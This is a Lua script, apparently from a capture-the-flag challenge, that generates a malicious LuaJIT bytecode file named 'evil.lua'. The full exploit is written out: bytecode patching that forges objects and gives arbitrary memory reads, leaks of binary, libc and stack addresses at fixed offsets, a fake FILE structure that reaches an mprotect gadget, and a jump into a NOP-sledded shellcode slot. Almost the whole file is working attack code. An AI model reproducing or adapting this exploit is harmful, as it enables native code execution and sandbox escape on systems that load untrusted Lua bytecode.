-- The following function serves as the template for evil.lua.
-- The general outline is to compile this function as-written, dump
-- it to bytecode, manipulate the bytecode a bit, and then save the
-- result as evil.lua.
local evil = function(v)
  -- This is the x86_64 native code which we'll execute. It
  -- is a very benign payload which just prints "Hello World"
  -- and then fixes up some broken state.
  local shellcode = "SHELLCODE";

  -- The dirty work is done by the following "inner" function.
  -- This inner function exists because we require a vararg call
  -- frame on the Lua stack, and for the function associated with
  -- said frame to have certain special upvalues.
  local function inner(...)
    if false then
      -- The following three lines turn into three bytecode
      -- instructions. We munge the bytecode slightly, and then
      -- later reinterpret the instructions as a cdata object,
      -- which will end up being `cdata<const char *>: NULL`.
      -- The `if false` wrapper ensures that the munged bytecode
      -- isn't executed.
      local cdata = -32749
      cdata = 0
      cdata = 0
    end

    -- Through the power of bytecode manipulation, the
    -- following three functions will become (the fast paths of)
    -- string.byte, string.char, and string.sub. This is
    -- possible because LuaJIT has bytecode instructions
    -- corresponding to the fast paths of said functions. Note
    -- that we musn't stray from the fast path (because the
    -- fallback C code won't be wired up). Also note that the
    -- interpreter state will be slightly messed up after
    -- calling one of these functions.
    local function s_byte(s) end
    local function s_char(i, _) end
    local function s_sub(s, i, j) end

    -- The following function does nothing, but calling it will
    -- restore the interpreter state which was messed up following
    -- a call to one of the previous three functions. Because this
    -- function contains a cdata literal, loading it from bytecode
    -- will result in the ffi library being initialised (but not
    -- registered in the global namespace).
    local function resync() return 0LL end

    -- Helper function to reinterpret the first four bytes of a
    -- string as a uint32_t, and return said value as a number.
    local function s_uint32(s)
      local result = 0
      for i = 4, 1, -1 do
        result = result * 256 + s_byte(s_sub(s, i, i))
        resync()
      end
      return result
    end

    -- The following line obtains the address of the GCfuncL
    -- object corresponding to "inner". As written, it just fetches
    -- the 0th upvalue, and does some arithmetic. After some
    -- bytecode manipulation, the 0th upvalue ends up pointing
    -- somewhere very interesting: the frame info TValue containing
    -- func|FRAME_VARG|delta. Because delta is small, this TValue
    -- will end up being a denormalised number, from which we can
    -- easily pull out 32 bits to give us the "func" part.
    local iaddr = (inner * 2^1022 * 2^52) % 2^32

    -- The following five lines read the "pc" field of the GCfuncL
    -- we just obtained. This is done by creating a GCstr object
    -- overlaying the GCfuncL, and then pulling some bytes out of
    -- the string. Bytecode manipulation results in a nice KPRI
    -- instruction which preserves the low 32 bits of the istr
    -- TValue while changing the high 32 bits to specify that the
    -- low 32 bits contain a GCstr*.
    local istr = (iaddr - 4) + 2^52
    istr = -32764 -- Turned into KPRI(str)
    local pc = s_sub(istr, 5, 8)
    istr = resync()
    pc = s_uint32(pc)

    -- The following three lines result in the local variable
    -- called "memory" being `cdata<const char *>: NULL`. We can
    -- subsequently use this variable to read arbitrary memory
    -- (one byte at a time). Note again the KPRI trick to change
    -- the high 32 bits of a TValue. In this case, the low 32 bits
    -- end up pointing to the bytecode instructions at the top of
    -- this function wrapped in `if false`.
    local memory = (pc + 8) + 2^52
    memory = -32758 -- Turned into KPRI(cdata)
    memory = memory + 0

    -- Helper function to read a uint32_t from any memory location.
    local function m_uint32(offs)
      local result = 0
      for i = offs + 3, offs, -1 do
        result = result * 256 + (memory[i] % 256)
      end
      return result
    end

    local function m_uint64(offs)
      return m_uint32(offs) + (m_uint32(offs + 4) * (2^32))
    end

    -- Helper function to extract the low 32 bits of a TValue.
    -- In particular, for TValues containing a GCobj*, this gives
    -- the GCobj* as a uint32_t. Note that the two memory reads
    -- here are GCfuncL::uvptr[1] and GCupval::v.
    local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
    local function low32(tv)
      v = tv
      return m_uint32(vaddr)
    end

    -- Helper function which is the inverse of s_uint32: given a
    -- 32 bit number, returns a four byte string.
    local function ub4(n)
      local result = ""
      for i = 0, 3 do
        local b = n % 256
        n = (n - b) / 256
        result = result .. s_char(b)
        resync()
      end
      return result
    end

    local function ub8(n)
      local result = ""
      for i = 0, 7 do
        local b = n % 256
        n = (n - b) / 256
        result = result .. s_char(b)
        resync()
      end
      return result
    end
    -- The following four lines result in the local variable
    -- called "mctab" containing a very special table: the
    -- array part of the table points to the current Lua
    -- universe's jit_State::patchins field. Consequently,
    -- the table's [0] through [4] fields allow access to the
    -- mcprot, mcarea, mctop, mcbot, and szmcarea fields of
    -- the jit_State. Note that LuaJIT allocates the empty
    -- string within global_State, so a fixed offset from the
    -- address of the empty string gives the fields we're
    -- after within jit_State.
    local mctab_s = "\0\0\0\0\99\4\0\0".. ub4(low32("") + 2748)
      .."\0\0\0\0\0\0\0\0\0\0\0\0\255\221\221\0\255\255\255\255"
    local mctab = low32(mctab_s) + 16 + 2^52
    mctab = -32757 -- Turned into KPRI(table)
    -- Construct a string consisting of 4096 x86 NOP instructions.
    local nop4k = "\144"
    for i = 1, 12 do nop4k = nop4k .. nop4k end

    -- Create a copy of the shellcode which is page aligned, and
    -- at least one page big, and obtain its address in "asaddr".
    local ashellcode = nop4k .. shellcode .. nop4k
    local asaddr = low32(ashellcode) + 16
    asaddr = asaddr + 2^12 - (asaddr % 2^12)
    local hex = function(v)
      return string.format("0x%x", v)
    end

    local leak_all = function(base)
      for i = base, base+0x200, 8 do
        val = m_uint64(i)
        if val > 0x20000000 and val < 0xffffffffffff then
          print(hex(base) .. ' + ' .. hex(i-base) .. ': ' .. hex(val))
        end
      end
    end

    local text_base = m_uint64(0x10000fa8) - 0x6f8b0
    print('text_base' .. ': ' .. hex(text_base))
    local stdout_at = m_uint64(text_base + 0x76458)
    print('stdout @ ' .. hex(stdout_at))
    local libc_base = stdout_at - 0xcc3f0
    -- leak_all(stdout_at-0x3f0+0x4000)
    local msg = m_uint64(stdout_at - 0x3f0 + 0x5388)
    print('msg ' .. hex(msg))
    local init_t = m_uint64(msg + 0x158)
    print('init_t ' .. hex(init_t))
    local stack_base = m_uint64(init_t + 0x40) + 0x40000
    print('stack @ ' .. hex(stack_base))

    -- The following seven lines result in the memory protection of
    -- the page at asaddr changing from read/write to read/execute.
    -- This is done by setting the jit_State::mcarea and szmcarea
    -- fields to specify the page in question, setting the mctop and
    -- mcbot fields to an empty subrange of said page, and then
    -- triggering some JIT compilation. As a somewhat unfortunate
    -- side-effect, the page at asaddr is added to the jit_State's
    -- linked-list of mcode areas (the shellcode unlinks it).
    -- local mcarea = mctab[1]
    -- mctab[0] = 0
    -- mctab[1] = asaddr / 2^52 / 2^1022
    -- mctab[2] = mctab[1]
    -- mctab[3] = mctab[1]
    -- mctab[4] = 2^14 / 2^52 / 2^1022
    -- while mctab[0] == 0 do end
    local find_val = function(base, target)
      for i = base, base+0x2000000, 4 do
        val = m_uint32(i)
        if val == target then
          print('Find!')
          print(i)
          return 0
        end
      end
    end

    -- leak_all(0x1000a000)

    -- $rdi is 0x10000378 when calling fshellcode()
    -- We will prepare a valid FILE structure at here to have
    -- proper function calls.
    addr = 0x10000378 -- stack_base - 0xa8
    local w = "\0\0\0\0\99\4\0\0".. ub8(addr)
    .."\0\0\0\0\0\0\0\0\255\255\0\0\255\255\255\255"
    local mc = low32(w) + 16 + 2^52
    mc = -32757 -- Turned into KPRI(table)

    -- The following three lines construct a GCfuncC object
    -- whose lua_CFunction field is set to asaddr. A fixed
    -- offset from the address of the empty string gives us
    -- the global_State::bc_cfunc_int field.
    local fshellcode = ub4(low32("") + 132) .."\0\0\0\0"..
    -- ub8(0xdeadbeef)
    ub8(libc_base + 0x31950) -- near fflush(), which calls two function ptrs consequently
    fshellcode = -32760 -- Turned into KPRI(func)

    -- Construct a FILE structure s.t. mc[9] and mc[10] will
    -- be called continuously.
    mc[5] = 1 / 2^52 / 2^1022
    mc[7] = 0 / 2^52 / 2^1022
    mc[9] = (text_base + 0x56ca0) / 2^52 / 2^1022 -- A nice gadget in frawler that do mprotect things.
    mc[306] = 0x1000a000 / 2^52 / 2^1022 -- rdi
    mc[309] = 0x16000 / 2^52 / 2^1022 -- rsi
    mc[1] = 0 / 2^52 / 2^1022
    mc[2] = 1 / 2^52 / 2^1022
    mc[10] = asaddr / 2^52 / 2^1022 -- shellcode
    -- Finally, we invoke the call of (libc_base + 0x31950)
    fshellcode()
  end
  inner()
end

-- Some helpers for manipulating bytecode:
local ffi = require "ffi"
local bit = require "bit"
local BC = {KSHORT = 41, KPRI = 43}

-- Dump the as-written evil function to bytecode:
local estr = string.dump(evil, true)
local buf = ffi.new("uint8_t[?]", #estr+1, estr)
local p = buf + 5

-- Helper function to read a ULEB128 from p:
local function read_uleb128()
  local v = p[0]; p = p + 1
  if v >= 128 then
    local sh = 7; v = v - 128
    repeat
      local r = p[0]
      v = v + bit.lshift(bit.band(r, 127), sh)
      sh = sh + 7
      p = p + 1
    until r < 128
  end
  return v
end

-- The dumped bytecode contains several prototypes: one for "evil"
-- itself, and one for every (transitive) inner function. We step
-- through each prototype in turn, and tweak some of them.
while true do
  local len = read_uleb128()
  if len == 0 then break end
  local pend = p + len
  local flags, numparams, framesize, sizeuv = p[0], p[1], p[2], p[3]
  p = p + 4
  read_uleb128()
  read_uleb128()
  local sizebc = read_uleb128()
  local bc = p
  local uv = ffi.cast("uint16_t*", p + sizebc * 4)
  if numparams == 0 and sizeuv == 3 then
    -- This branch picks out the "inner" function.
    -- The first thing we do is change what the 0th upvalue
    -- points at:
    uv[0] = uv[0] + 2
    -- Then we go through and change everything which was written
    -- as "local_variable = -327XX" in the source to instead be
    -- a KPRI instruction:
    for i = 0, sizebc do
      if bc[0] == BC.KSHORT then
        local rd = ffi.cast("int16_t*", bc)[1]
        if rd <= -32749 then
          bc[0] = BC.KPRI
          bc[3] = 0
          if rd == -32749 then
            -- the `cdata = -32749` line in source also tweaks
            -- the two instructions after it:
            bc[4] = 0
            bc[8] = 0
          end
        end
      end
      bc = bc + 4
    end
  elseif sizebc == 1 then
    -- As written, the s_byte, s_char, and s_sub functions each
    -- contain a single "return" instruction. We replace said
    -- instruction with the corresponding fast-function instruction.
    bc[0] = 147 + numparams
    bc[2] = bit.band(1 + numparams, 6)
  end
  p = pend
end

-- Finally, save the manipulated bytecode as evil.lua:
local f = io.open("evil.lua", "wb")
f:write(ffi.string(buf, #estr))
f:close()
